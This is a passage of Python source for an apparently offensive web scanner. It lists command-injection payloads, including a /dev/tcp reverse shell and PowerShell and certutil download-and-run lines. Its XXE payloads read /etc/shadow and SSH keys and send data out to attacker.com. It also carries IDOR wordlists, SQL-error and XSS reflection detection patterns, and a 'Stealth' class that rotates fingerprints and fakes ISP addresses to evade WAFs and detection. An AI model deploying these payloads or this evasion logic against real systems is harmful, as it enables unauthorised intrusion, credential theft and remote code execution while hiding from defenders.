        "%0aid;", "%0did|", "%0a&&id",
        ";cat${IFS}/etc/passwd", "${IFS}id", ";$IFS id",
        ";\ttid", "|\twhoami",
        ";id -u", "|grep uid",
        "$({id})", "$(`id`)",
        ";a=id;$a", ";x=id;${x}",
        ";id -u|mail -s x root",
        ";cat</etc/passwd", "{id,}", "{cat,/etc/passwd}",
        ";{cat,/etc/passwd}",
        ";exec<&0;exec>&1;sh -i",
        ";sh -i >& /dev/tcp/127.0.0.1/4444 0>&1",
        "|bash -c 'id'",
        ";bash -c id",
        ";/bin/sh -c id", "|env",
        ";echo cGlkZA==|base64 -d",
        ";printf 'id'|sh", "|echo id|sh",
        ";IFS=,;a=cat,/etc/passwd;$a",
        "|{cat,/etc/passwd}",
        ";id #", ";id|||echo ok",
    ],
    "windows": [
        "& whoami", "| whoami", "&& whoami", "& dir", "| dir", "& ping -n 4 127.0.0.1",
        "& type C:\\Windows\\win.ini", "| powershell -c whoami",
        "& net user", "| net localgroup administrators",
        "& ipconfig /all", "| ipconfig",
        "& tasklist", "| tasklist | findstr cmd",
        "& systeminfo", "| ver",
        "& wmic os get", "| wmic useraccount list",
        "& wmic service get", "& quser",
        "& query user", "| query session",
        "& taskkill /PID 1234 /F",
        "& sc query", "| sc query state= all",
        "& schtasks /query", "& netstat -an",
        "& route print", "& arp -a",
        "& nslookup whoami.example.com",
        "& powershell -enc dwBoAG8AYQBtAGkA",
        "& powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://x/x.ps1')",
        "& certutil -urlcache -split -f http://x/x.exe C:\\x.exe",
        "& bitsadmin /transfer x http://x/x C:\\x.exe",
        "& whoami /all", "& whoami /groups",
        "& whoami /priv", "& whoami /upn",
        "& dir C:\\Users\\ /s /b",
        "& type C:\\Users\\Public\\test.txt",
        "& cmd /c whoami", "| cmd /c whoami",
        "& for /F %i in (users.txt) do echo %i",
        "& wmic bios get serialnumber",
    ],
    "waf": [
        "%3bid", "%7cid", "%26%26id", "%60id%60", "%24%28id%29",
        ";${IFS}id", "|${IFS}id", "&&${IFS}whoami", "cat${IFS}/etc/passwd",
        "%3Bwhoami", "%7Cwhoami", "%26whoami",
        ";$(whoami)", "|$(whoami)",
        "%0Awhoami", "%0Dwhoami", "%0A%0Dwhoami",
        "%2 id", "%2Cid", "%1Bwhoami",
        ";${IFS}cat${IFS}${IFS}/etc/passwd",
        "%3B%24%28cat${IFS}%2Fetc%2Fpasswd%29",
        "%3Bcat%20/etc/passwd",
        "%7Ccat${IFS}%2Fetc%2Fpasswd",
        "%26%26cat%20%2Fetc%2Fpasswd",
        "%3Ccat%20%2Fetc%2Fpasswd",
        "%2 2whoami",
        ";$IFS$cat$IFS$passwd",
        "%24{IFS}cat${IFS}%2Fetc%2Fpasswd",
    ],
}

XXE = {
    "file": [
        "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><x>&xxe;</x>",
        "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///c:/windows/win.ini'>]><x>&xxe;</x>",
        "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///etc/shadow'>]><x>&xxe;</x>",
        "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///etc/hosts'>]><x>&xxe;</x>",
        "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///proc/self/environ'>]><x>&xxe;</x>",
        "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///var/log/apache2/access.log'>]><x>&xxe;</x>",
        "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///var/www/html/.env'>]><x>&xxe;</x>",
        "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///app/.env'>]><x>&xxe;</x>",
        "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///home/user/.ssh/id_rsa'>]><x>&xxe;</x>",
        "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///root/.ssh/id_rsa'>]><x>&xxe;</x>",
        "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///c:/inetpub/wwwroot/web.config'>]><x>&xxe;</x>",
    ],
    "oob": [
        "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY % xxe SYSTEM 'http://attacker.com/xxe.dtd'>%xxe;]><x/>",
        "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'http://attacker.com/?d=xxe'>]><x>&xxe;</x>",
        "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY % d SYSTEM 'http://attacker.com/evil.dtd'>%d;]><x/>",
        "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'ftp://attacker.com/file'>]><x>&xxe;</x>",
        "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'gopher://attacker.com:25/x'>]><x>&xxe;</x>",
        "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY % a SYSTEM 'file:///etc/passwd'><!ENTITY % b SYSTEM 'http://attacker.com/?d=%a;'>%b;]><x/>",
        "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'expect://id'>]><x>&xxe;</x>",
        "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=index.php'>]><x>&xxe;</x>",
    ],
    "billion_laughs": [
        "<?xml version='1.0'?><!DOCTYPE lolz [<!ENTITY lol 'lol'><!ENTITY lol2 '&lol;&lol;&lol;'>]><lolz>&lol2;</lolz>",
        "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY a 'XXXXXXXXXX'><!ENTITY b '&a;&a;&a;&a;&a;'>]><x>&b;</x>",
    ],
    "parameter": [
        "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY % dtd SYSTEM 'http://attacker.com/evil.dtd'><!ENTITY % file SYSTEM 'file:///etc/passwd'><!ENTITY % eval '<!ENTITY &#x25; exfil SYSTEM \"http://attacker.com/?d=%file;\">'>%dtd;%eval;%exfil;]><x/>",
    ],
}

def payload_stats():
    return {
        "sqli": sum(len(v) for v in SQLI.values()),
        "xss": sum(len(v) for v in XSS.values()),
        "nosql": sum(len(v) for v in NOSQL.values()),
        "ssti": sum(len(v) for v in SSTI.values()),
        "cmdi": sum(len(v) for v in CMDI.values()),
        "xxe": sum(len(v) for v in XXE.values()),
    }

def all_payloads():
    out=[]
    for group,db in [("SQLI",SQLI),("XSS",XSS),("NOSQL",NOSQL),("SSTI",SSTI),("CMDI",CMDI),("XXE",XXE)]:
        for cat,items in db.items():
            for p in items:
                out.append({"group":group,"category":cat,"payload":p})
    return out

IDOR_NAMES=["id","user_id","uid","account_id","profile_id","order_id","doc_id","file_id",
    "item_id","pid","cid","post_id","page_id","cat_id","group_id","member_id","record_id",
    "transaction_id","invoice_id","ticket_id","message_id","comment_id","attachment_id",
    "report_id","project_id","task_id","event_id","booking_id","subscription_id","payment_id",
    "customer_id","client_id","employee_id","staff_id","admin_id","role_id","permission_id",
    "resource_id","document_id","image_id","video_id","media_id","album_id","folder_id",
    "session_id","token_id","key_id","api_key","secret_id","config_id","setting_id",
    "log_id","audit_id","notification_id","campaign_id","ad_id","store_id","product_id",
    "category_id","tag_id","review_id","rating_id","vote_id","survey_id","form_id",
    "field_id","entry_id","submission_id","export_id","import_id","batch_id","job_id",
    "queue_id","worker_id","node_id","cluster_id","server_id","instance_id","container_id",
    "deployment_id","build_id","release_id","version_id","environment_id","tenant_id",
    "org_id","organization_id","team_id","department_id","branch_id","warehouse_id",
    "location_id","address_id","contact_id","phone_id","email_id","website_id","social_id"]

IDOR_HEADERS=["X-User-Id","X-User-ID","X-Account-Id","X-Member-Id","X-Profile-Id",
    "X-Client-Id","X-Customer-Id","X-Tenant-Id","X-Organization-Id","X-Company-Id",
    "X-Requester-Id","X-Auth-User-Id","X-Current-User-Id","X-Session-User-Id",
    "X-Api-User-Id","X-Real-User-Id","X-Effective-User-Id","X-Actor-Id",
    "X-Object-Id","X-Resource-Id","X-Entity-Id","X-Document-Id","X-Record-Id",
    "X-Forwarded-User-Id","X-Remote-User-Id","X-Original-User-Id"]

UUID_V4_RE=re.compile(r'[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}',re.IGNORECASE)
PATH_ID_RE=re.compile(r'/(\d{1,20})(?:/|$|\?|#|;)')
PATH_UUID_RE=re.compile(r'/([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12})(?:/|$|\?|#|;)',re.IGNORECASE)
PATH_HASH_RE=re.compile(r'/([a-f0-9]{16,64})(?:/|$|\?|#|;)',re.IGNORECASE)
API_PATH_RE=re.compile(r'(/api(?:|/v\d+)/[^\s?]+)',re.IGNORECASE)

def similarity(a,b):
    if not a or not b: return 0.0
    la=len(a); lb=len(b)
    mx=max(la,lb)
    if mx==0: return 1.0
    eq=sum(1 for x,y in zip(a,b) if x==y)
    return eq/mx

def content_hash(ct):
    ct2=re.sub(r'<[^>]+>','',ct)
    ct2=re.sub(r'\s+','',ct2).lower()
    return hashlib.md5(ct2.encode()).hexdigest()

def extract_structure(ct):
    tags=re.findall(r'<(\w+)[^>]*>',ct)
    attrs=set()
    for m in re.finditer(r'(\w+)=["\'][^"\']*["\']',ct):
        attrs.add(m.group(1))
    return tags,attrs

def is_error_page(ct,status):
    if status>=400: return True
    err_kws=["error","not found","does not exist","no results","unauthorized",
              "forbidden","access denied","invalid","expired","no data",
              "404","403","401","something went wrong","page not found",
              "resource not found","not available","no record","no matching"]
    cl=ct.lower()
    return sum(1 for w in err_kws if w in cl)>=3

def is_data_page(ct,status):
    ok_kws=["email","phone","address","name","username","price","amount",
            "date","time","description","title","avatar","profile","photo",
            "balance","account","order","invoice","total","status","role",
            "company","department","salary","ssn","card","bank"]
    cl=ct.lower()
    hits=sum(1 for w in ok_kws if w in cl)
    if status==200 and hits>=3 and len(ct)>500: return True
    if hits>=5 and len(ct)>1000: return True
    return False

def gen_uuid():
    return "%08x-%04x-4%03x-%04x-%012x"%(
        random.randint(0,0xffffffff),random.randint(0,0xffff),
        random.randint(0,0xfff),random.randint(0,0xffff)|0x8000,
        random.randint(0,0xffffffffffff))

def gen_test_ids(original=None):
    ids=["0","1","2","3","-1","999999","0001","100","1337","1000",
         "1001","9999","10000","100000","2147483647","4294967295"]
    if original and original.isdigit():
        n=int(original)
        for d in [-1,1,-2,2,5,10,50,100]:
            v=n+d
            if v>=0 and str(v) not in ids: ids.append(str(v))
        random.shuffle(ids)
        ids=ids[:20]
    return ids

def gen_test_uuids(original=None):
    uuids=[]
    if original:
        parts=original.split("-")
        if len(parts)==5:
            for i in range(3):
                np=list(parts)
                idx=random.randint(0,4)
                np[idx]="%08x"%random.randint(0,0xffffffff) if idx==0 else \
                         "%04x"%random.randint(0,0xffff) if idx in [1,2,3] else \
                         "%012x"%random.randint(0,0xffffffffffff)
                uuids.append("-".join(np))
    for _ in range(5): uuids.append(gen_uuid())
    return uuids

def gen_encoded(val):
    encs=[]
    try: encs.append(base64.b64encode(val.encode()).decode())
    except: pass
    try: encs.append(base64.urlsafe_b64encode(val.encode()).decode())
    except: pass
    try: encs.append(base64.b16encode(val.encode()).decode())
    except: pass
    try: encs.append(val.encode().hex())
    except: pass
    try: encs.append(urllib.parse.quote(val))
    except: pass
    try: encs.append(base64.b32encode(val.encode()).decode())
    except: pass
    return encs

def detect_api_paths(url):
    found=[]
    ps=urlparse(url)
    path=ps.path
    for m in API_PATH_RE.finditer(url):
        found.append(m.group(1))
    parts=path.split("/")
    for i,p in enumerate(parts):
        if p.lower() in ["api","rest","graphql","v1","v2","v3","v4","endpoint"]:
            base="/".join(parts[:i+2]) if i+2<=len(parts) else "/".join(parts[:i+1])
            found.append(base)
    return list(set(found))

ERR_PAT = [
    (r"SQL syntax.*MySQL","MySQL"),(r"Warning.*mysql_.*","MySQL"),
    (r"MySqlClient\.","MySQL (.NET)"),(r"PostgreSQL.*ERROR","PostgreSQL"),
    (r"Warning.*\Wpg_.*","PostgreSQL"),(r"Npgsql\.","PostgreSQL (.NET)"),
    (r"Driver.*SQL SERVER","MSSQL"),(r"OLE DB.*SQL SERVER","MSSQL"),
    (r"Microsoft SQL Native Client error","MSSQL"),
    (r"Oracle error","Oracle"),(r"Oracle.*Driver","Oracle"),
    (r"Warning.*\Woci_.*","Oracle"),(r"Warning.*\Wora_.*","Oracle"),
    (r"SQLite/JDBCDriver","SQLite"),(r"sqlite3.OperationalError","SQLite"),
    (r"DB2 SQL error:","DB2"),(r"CLI Driver.*DB2","DB2"),
    (r"Unclosed quotation mark","MSSQL/MySQL"),
    (r"SQL command not properly ended","Oracle"),
    (r"syntax error","Generic SQL"),(r"incorrect syntax near","MSSQL"),
    (r"ORA-[0-9]{5}","Oracle"),(r"Database error","Generic SQL"),
    (r"SQL error","Generic SQL"),(r"mysql_fetch","MySQL"),
    (r"pg_query","PostgreSQL"),(r"mssql_query","MSSQL"),
    (r"SQLSTATE\[\d+\]","Generic SQL"),(r"column .* does not exist","PostgreSQL"),
    (r"unknown column","MySQL"),(r"no such column","SQLite"),
    (r"Microsoft OLE DB Provider","MSSQL"),(r"ODBC SQL Server Driver","MSSQL"),
    (r"SQL Server.*[Ee]rror","MSSQL"),
    (r"ODBC.*SQL.*Driver","MSSQL/MySQL"),(r"Unclosed quotation mark after the character string","MSSQL"),
    (r"syntax error at line","Generic SQL"),
    (r"in.*line.*at.*里程.*query","Generic SQL"),
    (r"You have an error in your SQL syntax","MySQL"),
    (r"MySQLSyntaxErrorException","MySQL (Java)"),
    (r"org\.mysql.*Exception","MySQL (Java)"),
    (r"com\.mysql.*Exception","MySQL (Java)"),
    (r"org\.postgresql.*Exception","PostgreSQL (Java)"),
    (r"org\.postgresql\.util\.PSQLException","PostgreSQL"),
    (r"org\.hibernate.*Exception","Hibernate/Generic"),
    (r"h2\.SQLException","H2 Database"),(r"JDBCExceptionReporter","Generic JDBC"),
    (r"jQuery.*SQL.*Exception","Generic SQL"),
    (r"Exception.*System\.Data\.SqlClient","MSSQL (.NET)"),
    (r"MySqlConnector.*Exception","MySQL (.NET)"),
    (r"Npgsql.*Exception","PostgreSQL (.NET)"),
    (r"System\.Data\.SQLite","SQLite (.NET)"),
    (r" raised ","Generic Framework"),
    (r"PG::.*Error","PostgreSQL (Rails)"),
    (r"Mysql2::Error","MySQL (Rails)"),
    (r"ActiveRecord::StatementInvalid","Rails/SQL"),
    (r"Doctrine.*ORM.*Exception","Doctrine/SQL"),
    (r"sqlite3.OperationalError:","SQLite (Python)"),
    (r"psycopg2.*Error","PostgreSQL (Python)"),
    (r"_mysql_connector.*Error","MySQL (Python)"),
    (r"pyodbc.*ProgrammingError","MSSQL (Python)"),
    (r"division by zero","PostgreSQL/Oracle"),
    (r"value too long for type","PostgreSQL"),
    (r"Data too long for column","MySQL"),
    (r"String or binary data would be truncated","MSSQL"),
    (r"integer value out of range","PostgreSQL"),
    (r"SQL command not properly ended","Oracle"),
    (r"ORA-\d{5}","Oracle"),
    (r"ORA-\d{4}:","Oracle"),
    (r"PLS-\d{5}","Oracle"),
    (r"SP2-\d{4}","Oracle"),
    (r"ORA-\d{5}:","Oracle"),
    (r"Invalid column name","MSSQL"),
    (r"Subquery returns more than 1 row","MySQL/MSSQL"),
    (r"single-row subquery returns","Oracle"),
    (r"GROUP BY is missing","DB2"),
    (r"deadlocked","MSSQL locking"),
    (r"unique constraint","Generic SQL"),
    (r"foreign key constraint","Generic SQL"),
    (r"cannot delete.*constraint","Generic SQL"),
    (r"command not allowed","Generic SQL safe-update"),
    (r"you must specify at least one value","MySQL INSERT"),
    (r"integrity.*constraint.*violation","Generic SQL"),
    (r"sqlsrv_query","MSSQL (PHP)"),
    (r"ibase_query","Firebird"),
    (r"odbc_exec","ODBC Generic"),
    (r"Error Executing Database Query","ColdFusion"),
    (r"SQLSTATE\[42000\]","Generic SQL syntax"),
    (r"SQLSTATE\[42001\]","Generic SQL syntax"),
    (r"SQLSTATE\[42702\]","PostgreSQL ambiguous column"),
    (r"SQLSTATE\[42703\]","PostgreSQL undefined column"),
    (r"Microsoft SQL Server.*Native Client","MSSQL"),
    (r"Incorrect syntax near","MSSQL"),
    (r"Incomplete client information","MSSQL"),
    (r"Unclosed quotation mark","MSSQL/MySQL"),
    (r"warning: pg_connect","PostgreSQL"),
    (r"odbc_connect","ODBC"),
    (r"odbc_pconnect","ODBC persistent"),
    (r"ORA-00942:","Oracle table not found"),
    (r"ORA-01756:","Oracle quoted string"),
    (r"ORA-00936:","Oracle missing expression"),
    (r"ORA-00911:","Oracle invalid character"),
    (r"mongodb.*Error","MongoDB"),
    (r"MongoError","MongoDB"),
    (r"BSON.*Error","MongoDB"),
    (r"E11000","MongoDB duplicate key"),
    (r"$where.*not allowed","MongoDB $where"),
    (r"ObjectId.*not valid","MongoDB ObjectId"),
    (r"Redis.*WRONGTYPE","Redis"),
    (r"Could not connect to Redis","Redis"),
    (r"wrong number of arguments for 'get' command","Redis"),
]

XSS_PAT = [
    (r"<script>alert\(1\)</script>","Reflected Script"),
    (r"<script>alert\('XSS'\)</script>","Reflected Script"),
    (r"<img src=x onerror=alert\(1\)>","IMG OnError"),
    (r"<svg onload=alert\(1\)>","SVG OnLoad"),
    (r"<body onload=alert\(1\)>","Body OnLoad"),
    (r"javascript:alert\(1\)","JavaScript URI"),
    (r"<iframe","IFrame Injection"),(r"<embed","Embed Injection"),
    (r"<object","Object Injection"),
    (r"onerror=","Event Handler"),(r"onload=","Event Handler"),
    (r"onmouseover=","Event Handler"),(r"onfocus=","Event Handler"),
    (r"onclick=","Event Handler"),(r"onsubmit=","Event Handler"),
    (r"ontoggle=","Event Handler"),(r"onstart=","Event Handler"),
    (r"alert\(1\)","Alert Reflected"),
    (r"alert\(document\.domain\)","Domain Leak"),
    (r"alert\(document\.cookie\)","Cookie Leak"),
    (r"fetch\(","Fetch Reflected"),(r"document\.location","Redirect Reflected"),
    (r"document\.cookie","Cookie Reflected"),(r"eval\(","Eval Reflected"),
    (r"<marquee","Marquee Tag"),(r"<details","Details Tag"),
    (r"<video","Video Tag"),(r"<audio","Audio Tag"),
    (r"<button","Button Tag"),(r"<textarea","Textarea Tag"),
    (r"<select","Select Tag"),(r"<keygen","Keygen Tag"),
    (r"\\x61lert","Hex Encoded Alert"),(r"\\u0061lert","Unicode Encoded Alert"),
    (r"alert&#40;","HTML Entity Alert"),(r"alert&#x28;","Hex Entity Alert"),
    (r"<script>","Script Tag"),(r"</script>","Script Closing Tag"),
    (r"<script[^>]+src=","External Script Load"),
    (r"<svg[^>]+onload=","SVG Event Handler"),
    (r"<svg[^>]+onmouseover=","SVG Hover Handler"),
    (r"<input[^>]+onfocus=","Input Focus Handler"),
    (r"<input[^>]+onblur=","Input Blur Handler"),
    (r"<a[^>]+href=\"javascript:","JS URI in Anchor"),
    (r"<a[^>]+href='javascript:","JS URI in Anchor"),
    (r"<a[^>]+href=javascript:","JS URI in Anchor"),
    (r"<form[^>]+action=\"javascript:","JS URI in Form Action"),
    (r"<iframe[^>]+srcdoc=","Iframe srcdoc Injection"),
    (r"<iframe[^>]+src=\"javascript:","JS URI in Iframe"),
    (r"<object[^>]+data=\"javascript:","JS URI in Object"),
    (r"<embed[^>]+src=\"javascript:","JS URI in Embed"),
    (r"onanimationstart=","CSS Animation Hook"),
    (r"onwebkitanimationend=","CSS Animation Hook"),
    (r"ontransitionend=","CSS Transition Hook"),
    (r"onanimationend=","CSS Animation Hook"),
    (r"onpointerdown=","Pointer Event Hook"),
    (r"onpointerup=","Pointer Event Hook"),
    (r"onpointerenter=","Pointer Event Hook"),
    (r"ontoggle=","Toggle Event Hook"),
    (r"onbeforetoggle=","Before Toggle Hook"),
    (r"onbegin=","SVG Animate Begin"),
    (r"onend=","SVG Animate End"),
    (r"ondrag=","Drag Event Hook"),
    (r"ondragstart=","Drag Start Hook"),
    (r"ondragend=","Drag End Hook"),
    (r"ondrop=","Drop Event Hook"),
    (r"onreset=","Form Reset Hook"),
    (r"onsearch=","Search Event Hook"),
    (r"oncuechange=","Media Cue Hook"),
    (r"oncanplay=","Media CanPlay Hook"),
    (r"canplaythrough=","Media Hook"),
    (r"onauxclick=","Aux Click Hook"),
    (r"oncontextmenu=","Context Menu Hook"),
    (r"oncopy=","Copy Event Hook"),
    (r"oncut=","Cut Event Hook"),
    (r"onpaste=","Paste Event Hook"),
    (r"onpageshow=","Page Show Hook"),
    (r"onpagehide=","Page Hide Hook"),
    (r"onbeforeunload=","Before Unload Hook"),
    (r"onhashchange=","Hash Change Hook"),
    (r"onpopstate=","Pop State Hook"),
    (r"onstorage=","Storage Hook"),
    (r"onbeforeprint=","Before Print Hook"),
    (r"onafterprint=","After Print Hook"),
    (r"onloadstart=","Load Start Hook"),
    (r"onprogress=","Progress Hook"),
    (r"onsuspend=","Suspend Hook"),
    (r"onabort=","Abort Hook"),
    (r"onvolumechange=","Volume Change Hook"),
    (r"onratechange=","Rate Change Hook"),
    (r"onseeking=","Seeking Hook"),
    (r"onseeked=","Seeked Hook"),
    (r"onstalled=","Stalled Hook"),
    (r"onsuspend=","Suspend Hook"),
    (r"ontimeupdate=","Time Update Hook"),
    (r"onwaiting=","Waiting Hook"),
    (r"onmessage=","Message Hook"),
    (r"onmessageerror=","Message Error Hook"),
    (r"onbeforematch=","Before Match Hook"),
    (r"oncontentvisibilityautostatechange=","Visibility Auto Hook"),
    (r"onsecuritypolicyviolation=","CSP Violation Hook"),
    (r"ontransitionrun=","Transition Run Hook"),
    (r"ontransitionstart=","Transition Start Hook"),
    (r"ontransitioncancel=","Transition Cancel Hook"),
    (r"onanimationcancel=","Animation Cancel Hook"),
    (r"onanimationiteration=","Animation Iteration Hook"),
    (r"alarm\(\)","Alarm Call"),
    (r"confirm\(\w+\)","Confirm Box"),
    (r"prompt\(\w+\)","Prompt Box"),
    (r"window\.open\(","Window Open"),
    (r"window\.location\s*=","Location Assignment"),
    (r"location\.href\s*=","Href Assignment"),
    (r"location\.replace\(","Location Replace"),
    (r"location\.assign\(","Location Assign"),
    (r"navigator\.userAgent","UA Leak"),
    (r"navigator\.platform","Platform Leak"),
    (r"navigator\.language","Language Leak"),
    (r"navigator\.cookieEnabled","Cookie Check"),
    (r"navigator\.hardwareConcurrency","Hardware Leak"),
    (r"navigator\.deviceMemory","Memory Leak"),
    (r"navigator\.geolocation","Geolocation Access"),
    (r"navigator\.clipboard\.writeText","Clipboard Write"),
    (r"navigator\.share","Share API"),
    (r"navigator\.permissions\.query","Permissions Query"),
    (r"navigator\.mediaDevices","Media Devices Access"),
    (r"navigator\.contacts","Contacts Access"),
    (r"window\.name","window.name"),
    (r"window\.opener","Opener Leak"),
    (r"window\.parent","Parent Leak"),
    (r"window\.top","Top Leak"),
    (r"window\.frames","Frames Leak"),
    (r"window\.localStorage","localStorage Access"),
    (r"window\.sessionStorage","sessionStorage Access"),
    (r"window\.indexedDB","IndexedDB Access"),
    (r"new\s+Worker\(","Web Worker"),
    (r"new\s+SharedWorker\(","Shared Worker"),
    (r"new\s+ServiceWorker\(","Service Worker"),
    (r"fetch\(.*then\(","Fetch Chain"),
    (r"XMLHttpRequest","XHR"),
    (r"\.open\(['\"]GET","XHR GET"),
    (r"\.open\(['\"]POST","XHR POST"),
    (r"WebSocket","WebSocket"),
    (r"EventSource","SSE Source"),
    (r"new\s+Image\(\)","Image Object"),
    (r"new\s+Audio\(\)","Audio Object"),
    (r"new\s+Video\(\)","Video Object"),
    (r"new\s+Function\(","Dynamic Function"),
    (r"setTimeout\(.*alert","Timeout Alert"),
    (r"setInterval\(.*alert","Interval Alert"),
    (r"requestAnimationFrame","RAF Hook"),
    (r"window\.setTimeout","Window Timeout"),
    (r"document\.write","Document Write"),
    (r"document\.writeln","Document Writeln"),
    (r"document\.createElement","Create Element"),
    (r"\.innerHTML\s*=","Inner HTML"),
    (r"\.outerHTML\s*=","Outer HTML"),
    (r"\.insertAdjacentHTML","Insert Adjacent HTML"),
    (r"\.textContent","Text Content"),
    (r"\.innerText","Inner Text"),
    (r"\.setAttribute\(['\"]onclick","On Click Set"),
    (r"\.setAttribute\(['\"]onerror","On Error Set"),
    (r"\.addEventListener\(['\"]click","Click Listener"),
    (r"\.addEventListener\(['\"]load","Load Listener"),
    (r"\.addEventListener\(['\"]message","Message Listener"),
    (r"<img[^>]+src=\"x:","Invalid Src"),
    (r"<img[^>]+onerror=","IMG Error Handler"),
    (r"<img[^>]+src=x:x","Malformed Src"),
    (r"'-alert\(1\)-'","Prompt Injection"),
    (r";alert\(1\)//","Inline Injection"),
    (r"\"-alert\(1\)-\"","Inline Quote Injection"),
    (r"<output>","Output Tag"),
    (r"<menu>","Menu Tag"),
    (r"<menuitem>","Menu Item Tag"),
    (r"<dialog[^>]+open>","Dialog Tag"),
    (r"<slot>","Slot Tag"),
    (r"<template>","Template Tag"),
    (r"<content>","Content Tag"),
    (r"<shadow>","Shadow Tag"),
    (r"<style[^>]*>@import","Style Import"),
    (r"<style[^>]*>.*expression","CSS Expression"),
    (r"<link[^>]+href=javascript","Link JS URI"),
    (r"<meta[^>]+http-equiv=\"refresh\".*url=javascript:","Meta Refresh JS"),
    (r"<meta[^>]+http-equiv=refresh[^>]+javascript:","Meta Refresh JS"),
    (r"<base[^>]+href=javascript:","Base JS URI"),
    (r"<sup>script","Obfuscated Script"),
    (r"<sub>script","Obfuscated Script"),
    (r"<image[^>]+onerror=","Image Tag Variant"),
    (r"<ifr[^>]+src=javascript:","Obfuscated Iframe"),
    (r"<iFRAME","Case Obfuscation"),
    (r"<Img","Case Obfuscation IMG"),
    (r"<Script","Case Obfuscation Script"),
    (r"<ScRiPt","Mixed Case Script"),
    (r"<.Style","Case Style"),
    (r"<svg/onload","SVG Void Element"),
    (r"<svg>.*<script","SVG Script"),
    (r"<math[^>]*><mi[^>]*href=","MathML XLink"),
    (r"<annotation-xml[^>]*><script","Annotation XML"),
    (r"<foreignObject","Foreign Object"),
    (r"<use[^>]+href=","Use XLink"),
    (r"<set[^>]+to=javascript:","Set To JS"),
    (r"<animate[^>]+to=javascript:","Animate To JS"),
    (r"<animateTransform","Animate Transform"),
    (r"&lt;script&gt;","Encoded Script Tag"),
    (r"&lt;img.*&gt;","Encoded IMG"),
    (r"javascript&colon;","Encoded Colon"),
    (r"&Tab;","Encoded Tab"),
    (r"&NewLine;","Encoded Newline"),
    (r"%3Cscript","URL Encoded Script"),
    (r"%3Cimg","URL Encoded IMG"),
    (r"\\x3c","Hex Encoded LT"),
    (r"\\u003c","Unicode Encoded LT"),
    (r"&NewLine;&NewLine;","Double Newline"),
    (r"data:text/html","Data URI"),
    (r"data:application/javascript","JS Data URI"),
]

TO = 10

class Stealth:
    def __init__(self):
        self.mind=0.3; self.maxd=1.5
        self.no_delay=False
        self.proxy=None; self.proxies=[]; self.proxy_idx=0
        self.cookies={}; self.hdrs={}
        self.session_cookies={}
        self.req_count=0
        self.blocked_count=0
        self.captcha_detected=False
        self.waf_name=None
        self.was_blocked=False
        self.target_history=[]
        self.referer_chain=[]
        self.visited_paths=[]
        self.last_status=200
        self.last_length=0
        self._adaptive_delay_min=0.3
        self._adaptive_delay_max=1.5
        self._consecutive_errors=0
        self._burst_queue=[]
        self._human_read_speed=random.uniform(200,500)
        self._session_start=time.time()
        self._pages_read=0
        self._last_click_time=0
        self._tab_switches=0
        self._scroll_depth=0
        self._hover_pos=0
        self._engagement_score=1.0
        self.fingerprint=random.choice(["chrome_win","chrome_mac","chrome_linux",
                                        "firefox_win","firefox_mac","firefox_linux",
                                        "safari_mac","edge_win"])
        self._tls_ciphers={
            "chrome":["TLS_AES_128_GCM_SHA256","TLS_AES_256_GCM_SHA256",
                      "TLS_CHACHA20_POLY1305_SHA256"],
            "firefox":["TLS_AES_128_GCM_SHA256","TLS_CHACHA20_POLY1305_SHA256",
                       "TLS_AES_256_GCM_SHA256"],
            "safari":["TLS_AES_128_GCM_SHA256","TLS_AES_256_GCM_SHA256"],
            "edge":["TLS_AES_128_GCM_SHA256","TLS_AES_256_GCM_SHA256"],
        }
        self._alpn=["h2","http/1.1","http/1.1","h2,http/1.1"]
        self._tls_versions=["TLS 1.3","TLS 1.3","TLS 1.3","TLS 1.2"]
        self._http_versions=["HTTP/2","HTTP/1.1","HTTP/1.1","HTTP/2"]
        self._methods=["GET","GET","GET","GET","GET","HEAD","POST"]
        self._content_types=[
            "application/x-www-form-urlencoded","text/plain;charset=UTF-8",
            "multipart/form-data","application/json","text/xml"
        ]
        self._csp_nonceptr=base64.b64encode(os.urandom(8)).decode()[:12]
        self._isp_ips=[
            ("AS8075 Microsoft",[(13,80),(40,120),(52,160)]),
            ("AS15169 Google",[(8,35),(34,80),(64,130)]),
            ("AS7018 AT&T",[(12,100),(64,120),(76,130)]),
            ("AS32934 Facebook",[(31,65),(57,75),(66,129)]),
            ("AS4134 ChinaNet",[(1,60),(110,200),(220,255)]),
            ("AS7922 Comcast",[(23,40),(50,100),(67,80)]),
            ("AS28573 Claro",[(177,190),(187,200),(201,220)]),
        ]
        self._xss_padding=["_","__","utm_source","ref","lang","v","ver","t",
                           "nocache","rnd","_t","ts","cb","callback","jsonp"]
        self._accept_langs=[
            "en-US,en;q=0.9","en-GB,en;q=0.8,en-US;q=0.6",
            "en-US,en;q=0.5","en,en;q=0.9",
            "en-US,en;q=0.9,ar;q=0.8","en-US,en;q=0.9,fr;q=0.7",
